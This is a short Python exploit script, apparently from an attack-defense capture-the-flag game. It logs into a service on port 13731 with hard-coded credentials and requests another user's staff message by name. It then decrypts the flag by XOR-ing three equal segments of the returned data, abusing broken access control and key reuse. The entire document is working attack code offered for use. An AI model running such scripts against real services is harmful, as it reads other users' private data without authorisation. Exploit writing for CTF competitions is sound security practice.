from requests import Session
import sys

ip = sys.argv[1]
# get them from flagid
victim = sys.argv[2]
url = 'http://' + ip +  ':13731'

# register a user
attacker = 'kk'
password = 'eeee'

s = Session()
s.post(url + '/login', data = {'user': attacker, 'pass': password})
r = s.get(url + f'/staff/message/{victim}').json()
msg = bytes.fromhex(r['message'])

# msg payload is third the length
msg_len = len(msg) // 3
enc_msg = msg[0:msg_len]
msg_id = msg[msg_len : msg_len*2]
enc_msg_id = msg[msg_len*2 : msg_len*3]
flag = [m ^ k ^ n  for (m, k, n) in zip (enc_msg, msg_id, enc_msg_id)]
flag = ''.join(chr(c) for c in flag)
print(flag)
